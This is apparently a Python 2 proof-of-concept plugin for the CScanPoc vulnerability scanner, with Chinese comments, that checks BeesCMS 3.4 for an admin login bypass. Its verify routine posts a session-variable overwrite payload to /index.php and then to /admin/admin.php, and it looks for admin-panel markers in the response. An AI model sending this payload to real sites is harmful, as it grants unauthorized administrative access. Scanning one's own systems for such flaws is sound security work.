# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import cookielib

class Vuln(ABVuln):
    poc_id = '4e494777-c529-44a9-b482-2934fe782d19'
    name = 'BeesCMS /admin/admin.php 登录绕过' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-07-28'  # 漏洞公布时间
    desc = '''
        BeesCMS v3.4 /includes/fun.php 弱验证导致后台验证绕过漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=059180
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'BeesCMS'  # 漏洞应用名称
    product_version = '3.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b404e527-facb-48b8-a8c5-6923d36ce7ee'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            cookie = cookielib.CookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
            urllib2.install_opener(opener)
            postdata = "_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\r\n"
     
            request = urllib2.Request('{target}'.format(target=self.target) + "/index.php", data=postdata)
            r = urllib2.urlopen(request)
            # login test
            request2 = urllib2.Request('{target}'.format(target=self.target) + "/admin/admin.php", data=postdata)
            r = urllib2.urlopen(request2)
            content = r.read()
            if "admin_form.php?action=form_list&nav=list_order" in content:
                if "admin_main.php?nav=main" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()